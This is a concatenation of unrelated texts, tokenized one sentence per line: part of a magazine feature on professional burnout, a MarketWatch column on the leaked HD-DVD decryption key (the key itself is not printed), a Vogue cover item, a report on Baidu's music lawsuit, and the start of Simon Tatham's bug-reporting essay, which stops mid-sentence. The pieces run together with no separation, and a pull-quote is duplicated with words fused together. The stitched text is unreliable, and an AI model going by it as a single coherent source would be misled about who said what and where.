I look around Cass ’s office and realize it ’s the perfect hybrid of a shrink ’s suite and a bond trader ’s bachelor pad : a seascape of black leather , that mysterious favorite fabric of rich young men , on the one hand ; a menagerie of curios , totems , and exotica on the other .
( Though maybe there ’s a slight bias toward the bachelor pad — further inspection reveals a Wall Street movie poster in the corner , a bronze bull on the coffee table , and a squishy stress - ball he encourages his stymied clients to throw . )
Our instinct , of course , is not to feel much pity for the poor bond trader .
An epidemic of malaise among bankers and lawyers is far more likely to inspire jokes — Would n’t it be nicer if it were terminal ? — than concern and rafts of psychological studies .
( And the few studies out there are funny , if inadvertently .
In a special “ burnout ” issue of the Journal of Clinical Psychology six years ago , the essay on lawyers was most notable for the “ Select References and Recommended Reading ” that followed — four of eight were about masochism . )
But that does n’t make the phenomenon any less real .
In fact , consider lawyers for a moment : According to the New York Bar Association , turnover rates among mid-level associates in this city ’s law firms is 36 percent .
The whole system is predicated on burnout .
Why even bother treating associates well ?
It is possible something is the matter here .
Just as there were deep flaws in the work ecosystems of the caring professions , noticed by researchers in the seventies , it ’s possible there ’s something wrong with our professional environments — and perhaps , more broadly speaking , our culture of work .
Is n’t this worthy of examination ?
Work , after all , is a form of religion in a secular world .
Burning out in it amounts to a crisis of faith .
“ In the beginning , the caring professions were where the issue was , ” says Maslach .
“ But frankly , it ’s also where we could do the research .
Not all professions say , ‘ Sure , come on in and poke around and see what we ’re doing and who we are . ’ ”
But today , says Maslach , corporate settings are cautiously , slowly , cracking their doors , letting people like her in , because they recognize that something ’s gone awry .
“ Like in Silicon Valley , ” she says .
“ It used to be the case that people would say , ‘ You ’re burned out ?
You do n’t like the job ?
So quit .
I do n’t run a country club , ’ ” says Maslach .
“ But what was happening was the best and the brightest wanted to opt out .
They started saying , ‘ I ca n’t do this ; this is not a life . ’
They ’d go to the Midwest and start a pet - food store . ”
Maslach adds that when she did interviews at nasa , she noticed similar problems there .
“ So suddenly , these places were saying , ‘ Whoa , what do we need to do to get these people ? ’
Getting the most out of people did n’t actually mean getting the best .
That ’s when there was a new wave of interest in burnout . ”
She pauses for a second , searching for the right metaphor .
“ It ’s kind of like ergonomics , ” she finally says .
“ It used to be , ‘ You sit for work ?
Here ’s a chair . ’
But now we design furniture to fit and support the body .
And we ’re doing the same here .
The environments themselves have to say , ‘ We want people to thrive and grow . ’
There was a shift , finally , in how people understood the question . ”
Like the science of all emotion , attempts to quantify , analyze , and define burnout have a slightly stilted , unnatural quality .
It ’s a problem that ’s both physical and existential , an untidy agglomeration of external symptoms and private frustrations — how could such stuff be plotted on a graph ?
( I keep thinking of Bill Murray and those golf balls — or Bill Murray and his Suntory whiskeys in Lost in Translation , for that matter .
Does a culture even need a definition of burnout when it has Bill Murray ? )
But researchers have nevertheless made valiant efforts to try .
In 1981 , Maslach , now vice - provost at the University of California , Berkeley , famously co-developed a detailed survey , known as the Maslach Burnout Inventory , to measure the syndrome .
Her theory is that any one of the following six problems can fry us to a crisp : working too much ; working in an unjust environment ; working with little social support ; working with little agency or control ; working in the service of values we loathe ; working for insufficient reward ( whether the currency is money , prestige , or positive feedback ) .
“ I once talked to a pediatric dentist , ” she says , “ and he said , ‘ A good day is when there are no screamers . ’
And I ’m sure half the people he was talking about were the parents . ”
Perhaps the most surprising aspect of Maslach ’s research is that burnout is n’t necessarily a result of overwork .
It can be , certainly .
Michael Leiter , a lovely Canadian fellow and frequent collaborator of Maslach ’s , has elegantly called burnout a “ crisis in self - efficacy , ” which to me suggests that head - banging feeling of struggling mightily for too little or ( worse ) nothing in return .
Ayala Pines , a researcher in Israel who ’s looked at burnout in all sorts of inspired contexts ( including marriage ) , rather heartbreakingly sums up the problem as “ the failure of the existential quest ” — that moment when we wake up one morning and realize that what we ’re doing has appallingly little value .
She studied the insurance business , for example , a profession often associated with the ultimate cubicle tedium .
Yet she noticed something very interesting .
“ The ones who had some traumatic experience related to insurance when they were children — their house burned down or whatever — they can work for a long time without burning out , ” she says .
“ Because they came to the profession with a calling .
They feel their work is significant . ”
And Farber often calls burnout “ the gap between expectation and reward , ” which may have the most relevance to New Yorkers .
This has always been a city of inflated expectations .
People with more modest aims for themselves seem less prone to disillusionment .
Longitudinal , comprehensive data on burnout is hard to come by , in part because the United States is not especially renowned for its sensitivity to workers .
( The Bureau of Labor Statistics , an admirable organization with lots of dedicated economists , does not track worker satisfaction , for example . )
One of the few countries that does keep comprehensive data on burnout is , not surprisingly , the Netherlands , where the government is sensitive to the workplace needs of its citizenry .
Even there , longitudinal surveys show that roughly 10 percent of the workforce is burned out at any given time , with high - school teachers and primary - care health personnel ranking highest .
( I asked Wilmar Schaufeli , perhaps the most prominent researcher of burnout in the Netherlands today , whether he had any data on bankers .
“ In Holland , ” he says , “ these groups are not big enough to study .
But I do know there have been some reports in the press about stockbrokers who use cocaine and other illicit drugs just to keep up .
But this is another story . ” )
Still , enough research has been done in the United States and elsewhere to reveal interesting patterns of burnout .
Though loath to say that any one profession burns us out more than others — to her , it ’s more a question of how well we fit in our jobs —
Maslach found in her early work that the critical burnout period for most social - service agencies was between one and five years on the job .
( Interestingly , Stuart Marques , a spokesman for the United Federation of Teachers , notes that 45 percent of New York City public - school teachers have left their jobs by year five . )
Of all her studies both in Israel and abroad , Pines found that the most - burned - out people were nurses working in children ’s burn units —
“ It was too painful ” — and the least were serial entrepreneurs , those metabolic wonders creating companies as if they were baking cakes .
In 2001 , the Department of Surgery at the University of Michigan used the Maslach inventory to conduct a comprehensive study of burnout among its graduates from various residencies .
It showed a striking rate of high emotional exhaustion among practicing surgeons ( 32 percent ) and a rather low rate of depersonalization ( 13 percent ) , all of which seemed to utterly belie the notion that surgeons were unfeeling technocrats .
The conclusion also said that there was no correlation between exhaustion and caseload .
“ It has much more to do with frustrations in the changes in medicine , ” says Lazar J. Greenfield , one of the study ’s co-investigators and the chairman emeritus of Michigan ’s Department of Surgery .
“ The liability risk is higher , the patients are more demanding , reimbursements have progressively declined . ”
To me , the most beguiling data to emerge from burnout research are the profiles of the people who experience it most acutely .
In her early work , for instance , Maslach found that younger people burn out more often than older people , a finding that turns up again and again both here and abroad .
( In fact , that study from the University of Michigan explicitly said that younger surgeons burn out more quickly than older ones . )
This conclusion may seem counterintuitive , because we associate burning out somehow with midlife disillusionment .
But not if we think of burnout as the gap between expectations and rewards .
Older workers , as it turns out , have more perspective and more experience ; it ’s the young idealists who go flying into a profession , plumped full of high hopes , and run full - speed into a wall .
Maslach also found that married people burn out less often than single people , as long as their marriages are good , because they do n’t depend as much on their jobs for fulfillment .
And childless people , though unburdened by the daily strains of parenting , tend to burn out far more than people with kids .
( This , too , has been found across cultures ; in the Netherlands , a recent survey by the Bureau of Statistics showed that twice as many working women without children showed symptoms of burnout as did working women with underage children . )
It ’s much easier to disproportionately invest emotional and physical capital in the office if you have nowhere else to put it .
And the office seldom loves you back .
“ I did a study in the south of Israel of ‘ sandwich generation ’ couples — people who have young children and elderly parents , ” says Ayala Pines , the Israeli researcher .
“ This is very stressful , but what I found is that these people were not that burned out at all , because their families also provided emotional support . ”
Pines ’s work has also shown that people in fiercely individualist societies are more prone to burn out .
“ I once did a study comparing Mexican college professors to American college professors , ” she says .
“ The Mexican burnout rate was lower .
To them , the kind of lifestyle you describe in New York is insane .
At noon , you come home , eat , and see your family .
It is n’t even a question . ”
In Israel , she adds , she consistently found lower levels of burnout than in her studies in the United States , even though the lives of its citizens are tangibly threatened in a way that most Americans ’ are not .
“ And one explanation I have , ” she says , “ is that it ’s because of the existential threats to our daily lives .
You feel your own life is more significant . ”
Of course , Maslach also found that there are certain types — depressives , people with problems with anger or anxiety — who are more prone to burn out .
And if you ’re inclined to look at the world through the prism of psychoanalysis , you ’ll realize there are an almost infinite number of reasons why people choose the wrong kinds of jobs for themselves .
Pines says it best .
“ I think one of the reasons people burn out is because they take jobs that they hope , consciously or unconsciously , will help them overcome unresolved childhood issues , ” she says .
“ But instead of healing the childhood wound , work reopens it . ”
Woo hoo .

Saying hi .
Re : Hey pal .
Burnout .
WHEN are we eating ?
Open Enrollment Info . Quick q. Arrrrrrrrrrgh .
You are looking at nine e-mail subject lines I received in a one - hour period last week .
It was then that I realized I answer an e-mail once every 6.66 minutes .
The very thought of committing this fact to paper has kept me crippled for several seconds .
It does n’t seem like the sort of thing my boss should know .
One has to wonder whether the developments of a high - speed world have n’t made burnout worse .
First , the obvious :
With the advent of e-mail , cell phones , laptops , BlackBerrys ( or “ CrackBerrys ” — the argot here seems extremely apt ) , and other bits of high - speed doodadry , it has become virtually impossible , in senses both literal and metaphorical , to unplug from our jobs .
As Schaufeli , the Dutch researcher , notes , one of the strongest predictors of burnout is n’t just work overload but “ work - home interference ” — a sociologist ’s way of saying we ’re receiving phone calls from Tokyo during dinner and replying to clients on our BlackBerrys while making our children brush their teeth .
But the problems wrought by technological advancement go far beyond trespasses into our homes .
They ’ve done something to how we perceive time — and , by extension , work and leisure — itself .
There ’s a way New Yorkers often describe this , actually .
They say they ’re busy .
It ’s hard to find New Yorkers who do n’t believe themselves to be really , really busy , whether they have six kids or none , and whether they ’re trading bonds or driving cabs .
“ Busyness ” — a homophone of business , which cannot be an accident — has become the defining sensation of city life .
If busy meant “ fulfilled , ” or “ engaged , ” that ’d be one thing , but it seems , in most cases , to mean “ overloaded ” or “ frazzled . ”
In Faster : The Acceleration of Just About Everything , James Gleick points out that doctors and sociologists even have a name for this harried sensation : “ hurry sickness . ”
The great paradox of efficiency is that the more we speed up , the more acute our frustrations when we ’re forced to slow down .
Is it not possible that these ambient frustrations function as chronic stressors , and — in some subtle but crucial way — contribute to feeling worn out ?
Americans , Gleick writes , spend an estimated 3 billion minutes a year waiting on hold with the software industry ; they race to airports only to wait for hours ; they start to jitter inside elevators if the doors take more than four seconds to close .
( Elevator engineers even have a term for how long it takes — door dwell — before people start jamming their fingers on the door close button , which is usually a placebo , a function already disabled by litigation - conscious building managers . )
“ Gridlocked and tarmacked are metonyms of our era , ” Gleick writes .
“ To be gridlocked or tarmacked is to be stuck in place , our fastest engines idling all around us , as time passes and blood pressures rise . ”
Though it ’s not quite the same thing , I often feel gridlocked when answering my e-mail .
My friends would probably be startled to learn this , because my e-mails ricochet back within seconds , as if attached to a rubber band .
But it ’s hard to escape the sensation , as I answer each and every one , that I ’m being stopped at a tollbooth .
If one of the surest recipes for burnout , as Michael Leiter has said , is the sensation of inefficiency — particularly if we ’re still expending energy and seeing little in return — then there may be something about the modern office that conspires to burn us out .
In 2005 , a psychiatrist at King ’s College London did a study in which one group was asked to take an IQ test while doing nothing , and a second group to take an IQ test while distracted by e-mails and ringing telephones .
The uninterrupted group did better by an average of ten points , which was n’t much of a surprise .
What was a surprise is that the e-mailers also did worse , by an average of six points , than a group in a similar study that had been tested while stoned .
That ’s right .
Stoned .
Those people were literally burned out , and they did better .
“ There is something about interruption that makes people especially unproductive , ” says Suzanne Bianchi , a sociology professor at the University of Maryland and co-author of the new book Changing Rhythms of American Family Life .
“ And technology interrupts us all the time — e - mails , cell phones .
It feeds into our sense of control ” — another key factor in burning out , feeling a lack of control — “ and highly educated workers all will talk as if they ’re terribly overworked , how they feel as if there ’s never enough time .
Partly , we ’re supposed to say it , but I think people also genuinely feel that way , even though they have the time .
That ’s what ’s intrigued us .
The subjective and the objective do n’t line up . ”
Indeed , that ’s her colleagues ’ most startling finding of all .
Most Americans believe they work more today than they did 35 years ago .
Yet according to the American Time Use Survey , an ambitious project that for 41 years has been asking thousands of participants to keep detailed time diaries , Americans now have five more hours of leisure per week ( 38 ) than they did in 1965 .
Certainly , there are academics who reject these numbers — in The Overworked American , published in 1992 , the economist Juliet Schor calculated we were working nearly an extra month per year , setting off a rather sharp debate about her methodology — but even those who agree our leisure time is increasing will readily concede that Americans experience their leisure quite differently and therefore may feel as if they ’re working more .
For one thing , it ’s non-contiguous leisure time , time meted out in discrete increments .
Human beings have always resisted the fracturing of time .
Gleick points out that Plautus cursed the sundial .
Now , he says , we gain 90 - second reprieves with our microwave ovens .
But do we do anything meaningful in those 90 seconds ?
Or do they vanish in the same particle puff ?
John Robinson , the University of Maryland sociologist who calculated those expanding leisure hours for the time - use survey , argues that our obsession with efficiency at work has unfortunately seeped into our attitudes toward leisure , with the multitasking of our downtime as the loony and paradoxical result .
We run on the treadmill while listening to music while watching TV .
We cook while flipping through a magazine while yakking on the phone .
All of which raises a question :
If our leisure is n’t restorative , are n’t we more apt to burn out ?
“ Oh , yes , I would think so , ” says Schaufeli .
“ Because that ’s what burnout is , in essence .
A mismatch between effort and recovery . ”
Alden Cass is sitting in his office , showing me his various tools for reigniting burned - out clients .
“ I created this thing , bullish - versus - bearish thinking , ” he says .
He hands me a worksheet with silhouettes of bulls and bears .
“ I give them for homework so they can monitor their thoughts , ” he continues .
“ Usually , when you ’re burnt out , your first thought is vicious , irrational .
What we call bearish .
So they start monitoring what goes on in their heads .
And once they have evidence , they can redirect those thoughts .
They have ammo now . ”
Burnout , says Farber , is “ the gap between expectation and reward , ” which may have the mostrelevance to New Yorkers .
Thishas always been a city of inﬂatedexpectations .
Because Cass is an executive coach , it ’s his job to tell people how to assume responsibility for their own distress .
But Maslach has always contended that burnout says more about the employer than it does about the employee .
“ Imagine investigating the personality of cucumbers to discover why they had turned into sour pickles , ” she famously wrote in 1982 , “ without analyzing the vinegar barrels in which they ’d been submerged ! ”
The trouble is that corporate America has always been leery of the presence of burnout researchers .
When Cass tried writing his dissertation about Wall Street burnout , he was turned away from every human - resources office downtown .
Maslach ’s not surprised .
“ Anything that might suggest that something is not working well in a company or an organization of some kind , people then worry , This could be used for a lawsuit , ” she says .
“ So doing research is fraught with peril . ”
But today , Maslach and her colleague , Michael Leiter , are attempting longitudinal studies of employees in a variety of companies and institutions , hoping they can find early - warning signals of distress .
Some of what they ’ve found has been pretty amazing .
In a university system , for instance , Maslach discovered that a certain employee award , designed with the best of intentions , was making people nuts .
“ You could not have designed a better award to engender backbiting and hostility , ” she says .
Milton Moskowitz , co-author of Fortune magazine ’s annual “ 100 Best Companies to Work For , ” keeps a mini-compendium of things that companies do to prevent burnout .
Intel , for example , allows its employees to take an eight - week sabbatical once every seven years .
( Of course , most Europeans take this much vacation every year , but still . )
The managers at Boston Consulting Group place their consultants in a metaphorical “ Red Zone ” if they work 60 hours a week and send someone to come talk to them if the trend continues .
And once a quarter , Dow Corning has a no-meetings week .
But it ’s an uphill battle .
Moskowitz also tells me about a conversation he once had with an employee at a high - profile high - tech firm .
He reached this young man during the day , but only barely , because this fellow was heading out to see a movie .
Moskowitz marveled at how wonderful that was and how flexible his employer must be .
“ Oh , yes , ” the employee told him .
“ Here , I can work whatever 80 hours per week I want . ”
“ The worst case of Wall Street burnout I know is of this guy who wound up driving a cab , ” Cass tells me .
A cab ?
He shrugs .
“ There ’s a control factor in driving a cab .
You go from point A to point B . On Wall Street , you start your day with no idea how it ’s going to end . ”
driving a taxi does n’t sound like a particularly soothing solution to burnout .
But there ’s something to the idea of changing jobs .
Maybe extreme burnout victims do n’t need a life coach or a sabbatical or a no-meetings week .
Maybe what they need is a headhunter .
Usually , I ca n’t imagine taking up another career .
But in the rare moments I do , my fantasies tend to run in an altruistic direction :
Teach high - school English in a poor school district .
Fight poverty in Africa .
Donate a kidney .
And I wonder how many of my contemporaries share these fantasies or have actually done it — that is , made a change in their lives that actually relieves them from the crushing burdens of thinking about themselves .
How strange would it be if people were trying to cure their burnout today by leaping to the helping professions , the same professions that led people to study burnout in the first place ?
This July , the Boston Globe ran a startling story that said 64 percent of all students entering mortuary college today are over 30 , rather than 23 , which they were a generation ago .
( “ Frequently , these students want to emulate a wonderful job that a funeral professional did for them , ” Lyn Prendergast , executive vice - president of Fine Mortuary College , told the Globe .
“ Or they had a poor experience and feel they can do a far better job for the bereaved . ” )
Of the 75 law firms surveyed in New York in The American Lawyer ’s recent survey of mid-level associates , the firms ranked No. 1 ( Dickstein Shapiro ) and No. 3 ( Patterson Belknap ) had one thing in common :
They both received perfect scores on their attitudes toward pro bono work .
I phone Barbara G. Wheeler , the president of Auburn Theological Seminary .
She tells me that the average age of female students entering divinity school is 37 .
Thirty - seven .
My age exactly .
If only I were n’t a Jew and an atheist , I ’d be in business .
“ Every seminary can introduce you to at least some students who ’ve been lawyers , journalists , opera singers , ” she says .
“ They have a lot of tolerance for the little annoyances of the job , because they want to deal with life - and - death issues — the moments when people tend to be most human , as Bill Coffin said . ”
Lindley DeGarmo , the pastor and head of staff at Towson Presbyterian Church in Maryland , harbored such desires .
It was Wheeler who put me in touch with him .
DeGarmo enrolled at Union Theological Seminary in 1996 , when he was 42 years old .
He sometimes jokes that the decision cost him , conservatively speaking , $ 6 million , because he missed the peak of the boom .
At the time , he was pulling in nearly a million dollars annually on Wall Street and living in a 3,000 - square - foot apartment in Brooklyn Heights .
“ Maybe I ’d have done more good if I ’d worked for a few more years and then given the seminary the money , ” he says .
Though perhaps it ’s just as well .
Just before entering the seminary , DeGarmo was considering a job with an intriguing company called Enron .
DeGarmo says he can’t isolate the moment that he knew his job was n’t for him .
“ I ’ve never been able to make the direct correlation : Hmm , I ’m here on Monday morning , and I do n’t like the values — would n’t it be nice to minister ? ” he says .
“ But when I fantasized about what I wanted to do , it was this . ”
Particularly after he reached 40 and finally married .
He started devouring theological texts .
He started attending church in New York , where for the first time he “ encountered really good preaching , exegesis , grappling with the larger tradition of the church . ”
Then came the moment , just after his child was born , when he was sitting in a lonely hotel on a fruitless business trip .
He had absolutely no clue what he was doing there .
“ There are times when this is much more difficult work than what I dealt with as an investment banker , ” he says .
“ It draws on a whole lot more parts of you .
You get personally invested .
I did 27 funerals last year .
It can be draining .
But by and large , the joys outweigh the sorrows .
“ In seminary , ” he suddenly says , “ I did a bit of depth psychology . ”
DeGarmo had never studied it before .
He was assigned Memories , Dreams , Reflections , and found himself beguiled by Carl Jung ’s theories about the opposing parts of our personalities .
“ I remember Jung saying that the general trajectory of your life is to work to your strength in your younger life , going great guns to establish yourself at whatever you ’re doing , ” he continues .
“ But at some point in midlife , the other part of your personality — the feminine instead of masculine , or whatever other opposing trait — is looking for expression .
And if you do n’t allow it to express itself , you ’re not , in effect , going to become a whole person .
Brittle is the word he uses . ”
He ’s recalling this so fondly and so lyrically that I find myself caught in his same reverie .
It ’s hard to imagine this man was once a guy in a Town Car on Wall Street .
“ So it occurs to me that maybe people who are burning out are bumping up against that phenomenon that Jung talks about , ” concludes DeGarmo .
“ The masculine bumping up against the feminine , or the right brain against the left .
Whoever you are . ”
It ’s a lovely sentiment , almost fit for a sermon .
The question now is how many Wall Streeters he can convert .
BERKELEY , Calif. ( MarketWatch ) --
You'd think the world would be coming to an end after a computer enthusiast discovered and decoded a 32 - digit hexadecimal number found in all HD - DVD players ( and possibly Blu- ray players , depending on whom you ask ) .
This number is apparently the key to crack the data encryption that prevents the copying of discs .
The code did n't take long to leak onto the Web , and then onto one of the most popular news - sharing sites , Digg.com .
Digg immediately got a threatening letter from a lawyer and took down the posting with the code .
As is often the case , a firestorm of user protest ensued .
Digg eventually apologized and put the post back on the site , where it proliferated like crazy .
It was too late anyway ; the code was everywhere because of the so - called scandal .
As a publicity stunt , Digg 's waffling could not have worked better -- for Digg .
But the episode reemphasizes the new era in corporate control of trade secrets :
It 's harder to keep a secret than ever before , and lawyers are not helping .
I think it 's time I doled out some advice for the corporate executives who can't bring themselves to admit that it is not 1952 anymore .
“ It 's harder to keep a secret than ever before , and lawyers are not helping . ”
First of all , lawyers can be idiots and have no sense of public relations .
According to the New York Times and others , this entire current fiasco was started by the too - common threatening letter .
When an attorney sends out threatening letters to people these days , especially to bloggers and other Internet mavens , these documents get scanned and published online to be widely distributed .
Most of these letters are written to sound intimidating , often with a lot of language that 's mean - spirited .
People , sometimes by the millions , read these and get angry not at the lawyer , but at the company that hired the lawyer .
This can lead to a public - relations disaster .
Once something goes out on the Net , it gets copied and posted elsewhere .
Even if the original is taken down , other versions appear immediately .
The legal profession has not adjusted to this new phenomenon , and as long as they are being paid by the billable hour , they figure the PR folks ( also paid by the billable hour ) can fix any problem .
The thinking seems to be a one - dimensional " we did our jobs , " CYA approach .
Attorneys will claim that they were compelled to act to protect the client .
But if ruining a client 's image and reputation , and often turning it into a laughingstock is done in the name of " protecting , " then perhaps the legal profession should reconsider whether it 's being counterproductive .
The epitome of this has been how the MP3 music - sharing scene -- which was underground and not taken seriously by anyone except a few college kids back in the mid-1990s -- was marketed by lawyers , who waged a holy war against trading at the behest of the Recording Industry Association of America .
This war did nothing but popularize a system of sharing music files , and I can assure you that it went from fringe to mainstream only because of highly publicized legal actions against people who essentially were judgment - proof .
In less than a decade , the music business was decimated .
It 's same kind of situation with this mysterious number that cracks the DVD encryption .
First of all , nobody , myself included , knows what to do with the code .
It is practically useless .
“ Nobody , myself included , knows what to do with the DVD code .
It is practically useless . ”
If the lawyers did nothing , it would have languished as a curiosity with perhaps a few crackers developing some software with it .
The end result would be a few cracked copies of DVDs running on a few computers here and there .
Because of the lawyers and the nasty letters , now everyone online knows how important this number must be .
Boom !
Now users get to work on it .
Heck of a job , lawyers .
Investors should be aware of the overall dangers the legal profession present to companies , and how its current and generalized naiveté can sink fortunes overnight .
While I know of no corporation that has been bankrupted by this sort of fiasco , it will happen eventually if lawyers does n't catch up with the times .
Or perhaps some executives should think for themselves .
British Vogue have sometimes surprised people with their cover choices , and on the May 07 cover they picked a rather unlikely cover boy .
Johnny Borrell from the UK band , the Razorlight stars along side Russian supermodel , Natalia Vodianova , in his trademark skinny white jeans .
The article relating to the cover shoot should be interesting , with a cover line “ Rocking with Razorlight .
When Natalia met Johnny ” .
Borrell joins an elite group of men who have appeared on the cover of the UK fashion bible , which includes Robbie Williams , Bono and Elton John .
And he holds good company as well , he ’s dating Hollywood star and frequent Vogue cover girl , Kirsten Dunst .
The in - love pair have been spotted looking rather cozy in London and the US recently .
What do you think of the cover ?
At least it ’s better than Pete Doherty on the cover of Vogue Hommes right ?
Many music companies have blamed falling CD sales on piracy
Baidu.com faced a lawsuit from music companies after posting links to sites offering illegal music downloads .
But the ruling said the service did not constitute an infringement as the music was downloaded from webservers of third parties , state press reported .
This overturns an earlier ruling , which had ordered Baidu to pay a distributor of EMI 68,000 yuan ( £ 8,400 ) .
Companies including EMI , Sony BMG , Warner Music and Universal Music had demanded a public apology from Baidu , the suspension of its download service and 1.73 m yuan ( $ 216,250 ) compensation .
Baidu argued the MP3 search engine it provided was the same as other search engines providing links to web pages , news and pictures .
" If the music companies had won , the whole search engine sector would have ground to a halt , " Xinhua news agency quoted a Baidu spokesman as saying .
The report said the music companies would appeal against the ruling .

How to Report Bugs Effectively
by Simon Tatham , professional and free - software programmer
[ English | Português | 简体中文 | Česky | Dansk | Deutsch | Español | Français | Magyar | Italiano | 日本語 | Nederlands | Polski | Русский | 繁體中文 ]
Introduction
Anybody who has written software for public use will probably have received at least one bad bug report .
Reports that say nothing ( " It does n't work ! " ) ; reports that make no sense ; reports that do n't give enough information ; reports that give wrong information .
Reports of problems that turn out to be user error ; reports of problems that turn out to be the fault of somebody else 's program ; reports of problems that turn out to be network failures .
There 's a reason why technical support is seen as a horrible job to be in , and that reason is bad bug reports .
However , not all bug reports are unpleasant : I maintain free software , when I 'm not earning my living , and sometimes I receive wonderfully clear , helpful , informative bug reports .
In this essay I 'll try to state clearly what makes a good bug report .
Ideally I would like everybody in the world to read this essay before reporting any bugs to anybody .
Certainly I would like everybody who reports bugs to me to have read it .
In a nutshell , the aim of a bug report is to enable the programmer to see the program failing in front of them .
You can either show them in person , or give them careful and detailed instructions on how to make it fail .
If they can make it fail , they will try to gather extra information until they know the cause .
If they can't make it fail , they will have to ask you to gather that information for them .
In bug reports , try to make very clear what are actual facts ( " I was at the computer and this happened " ) and what are speculations ( " I think the problem might be this " ) .
Leave out speculations if you want to , but do n't leave out facts .
When you report a bug , you are doing so because you want the bug fixed .
There is no point in swearing at the programmer or being deliberately unhelpful : it may be their fault and your problem , and you might be right to be angry with them , but the bug will get fixed faster if you help them by supplying all the information they need .
Remember also that if the program is free , then the author is providing it out of kindness , so if too many people are rude to them then they may stop feeling kind .
" It does n't work . "
Give the programmer some credit for basic intelligence : if the program really did n't work at all , they would probably have noticed .
Since they have n't noticed , it must be working for them .
Therefore , either you are doing something differently from them , or your environment is different from theirs .
They need information ; providing this information is the purpose of a bug report .
More information is almost always better than less .
Many programs , particularly free ones , publish their list of known bugs .
If you can find a list of known bugs , it 's worth reading it to see if the bug you 've just found is already known or not .
If it 's already known , it probably is n't worth reporting again , but if you think you have more information than the report in the bug list , you might want to contact the programmer anyway .
They might be able to fix the bug more easily if you can give them information they did n't already have .
This essay is full of guidelines .
None of them is an absolute rule .
Particular programmers have particular ways they like bugs to be reported .
If the program comes with its own set of bug - reporting guidelines , read them .
If the guidelines that come with the program contradict the guidelines in this essay , follow the ones that come with the program !
If you are not reporting a bug but just asking for help using the program , you should state where you have already looked for the answer to your question .
( " I looked in chapter 4 and section 5.2 but could n't find anything that told me if this is possible . " )
This will let the programmer know where people will expect to find the answer , so they can make the documentation easier to use .
" Show me . "
One of the very best ways you can report a bug is by showing it to the programmer .
Stand them in front of your computer , fire up their software , and demonstrate the thing that goes wrong .
Let them watch you start the machine , watch you run the software , watch how you interact with the software , and watch what the software does in response to your inputs .
They know that software like the back of their hand .
They know which parts they trust , and they know which parts are likely to have faults .
They know intuitively what to watch for .
By the time the software does something obviously wrong , they may well have already noticed something subtly wrong earlier which might give them a clue .
They can observe everything the computer does during the test run , and they can pick out the important bits for themselves .
This may not be enough .
They may decide they need more information , and ask you to show them the same thing again .
They may ask you to talk them through the procedure , so that they can reproduce the bug for themselves as many times as they want .
They might try varying the procedure a few times , to see whether the problem occurs in only one case or in a family of related cases .
If you 're unlucky , they may need to sit down for a couple of hours with a set of development tools and really start investigating .
But the most important thing is to have the programmer looking at the computer when it goes wrong .
Once they can see the problem happening , they can usually take it from there and start trying to fix it .
" Show me how to show myself . "
This is the era of the Internet .
This is the era of worldwide communication .
This is the era in which I can send my software to somebody in Russia at the touch of a button , and he can send me comments about it just as easily .
But if he has a problem with my program , he can't have me standing in front of it while it fails .
" Show me " is good when you can , but often you can't .
If you have to report a bug to a programmer who can't be present in person , the aim of the exercise is to enable them to reproduce the problem .
You want the programmer to run their own copy of the program , do the same things to it , and make it fail in the same way .
When they can see the problem happening in front of their eyes , then they can deal with it .
So tell them exactly what you did .
If it 's a graphical program , tell them which buttons you pressed and what order you pressed them in .
If it 's a program you run by typing a command , show them precisely what command you typed .
Wherever possible , you should provide a verbatim transcript of the session , showing what commands you typed and what the computer output in response .
Give the programmer all the input you can think of .
If the program reads from a file , you will probably need to send a copy of the file .
If the program talks to another computer over a network , you probably can't send a copy of that computer , but you can at least say what kind of computer it is , and ( if you can ) what software is running on it .
" Works for me .
So what goes wrong ? "
If you give the programmer a long list of inputs and actions , and they fire up their own copy of the program and nothing goes wrong , then you have n't given them enough information .
Possibly the fault does n't show up on every computer ; your system and theirs may differ in some way .
Possibly you have misunderstood what the program is supposed to do , and you are both looking at exactly the same display but you think it 's wrong and they know it 's right .
So also describe what happened .
Tell them exactly what you saw .
Tell them why you think what you saw is wrong ; better still , tell them exactly what you expected to see .
If you say " and then it went wrong " , you have left out some very important information .
If you saw error messages then tell the programmer , carefully and precisely , what they were .
They are important !
At this stage , the programmer is not trying to fix the problem : they 're just trying to find it .
They need to know what has gone wrong , and those error messages are the computer 's best effort to tell you that .
Write the errors down if you have no other easy way to remember them , but it 's not worth reporting that the program generated an error unless you can also report what the error message was .
In particular , if the error message has numbers in it , do let the programmer have those numbers .
Just because you can't see any meaning in them does n't mean there is n't any .
Numbers contain all kinds of information that can be read by programmers , and they are likely to contain vital clues .
Numbers in error messages are there because the computer is too confused to report the error in words , but is doing the best it can to get the important information to you somehow .
At this stage , the programmer is effectively doing detective work .
They do n't know what 's happened , and they can't get close enough to watch it happening for themselves , so they are searching for clues that might give it away .
Error messages , incomprehensible strings of numbers , and even unexplained delays are all just as important as fingerprints at the scene of a crime .
Keep them !
If you are using Unix , the program may have produced a core dump .
Core dumps are a particularly good source of clues , so do n't throw them away .
On the other hand , most programmers do n't like to receive huge core files by e-mail without warning , so ask before mailing one to anybody .
Also , be aware that the core file contains a record of the complete state of the program : any " secrets " involved ( maybe the program was handling a personal message , or dealing with confidential data ) may be contained in the core file .
" So then I tried . . . "
There are a lot of things you might do when an error or bug comes up .
Many of them make the problem worse .
A friend of mine at school deleted all her Word documents by mistake , and before calling in any expert help , she tried reinstalling Word , and then she tried running Defrag .
Neither of these helped recover her files , and between them they scrambled her disk to the extent that no Undelete program in the world would have been able to recover anything .
If she 'd only left it alone , she might have had a chance .
Users like this are like a mongoose backed into a corner : with its back to the wall and seeing certain death staring it in the face , it attacks frantically , because doing something has to be better than doing nothing .
This is not well adapted to the type of problems computers produce .
Instead of being a mongoose , be an antelope .
When an antelope is confronted with something unexpected or frightening , it freezes .
It stays absolutely still and tries not to attract any attention , while it stops and thinks and works out the best thing to do .
( If antelopes had a technical support line , it would be telephoning it at this point . )
Then , once it has decided what the safest thing to do is , it does it .
When something goes wrong , immediately stop doing anything .
Do n't touch any buttons at all .
Look at the screen and notice everything out of the ordinary , and remember it or write it down .
Then perhaps start cautiously pressing " OK " or " Cancel " , whichever seems safest .
Try to develop a reflex reaction - if a computer does anything unexpected , freeze .
If you manage to get out of the problem , whether by closing down the affected program or by rebooting the computer , a good thing to do is to try to make it happen again .
Programmers like problems that they can reproduce more than once .
Happy programmers fix bugs faster and more efficiently .
" I think the tachyon modulation must be wrongly polarised . "
It is n't only non-programmers who produce bad bug reports .
Some of the worst bug reports I 've ever seen come from programmers , and even from good programmers .
I worked with another programmer once , who kept finding bugs in his own code and trying to fix them .
Every so often he'd hit a bug he could n't solve , and he'd call me over to help .
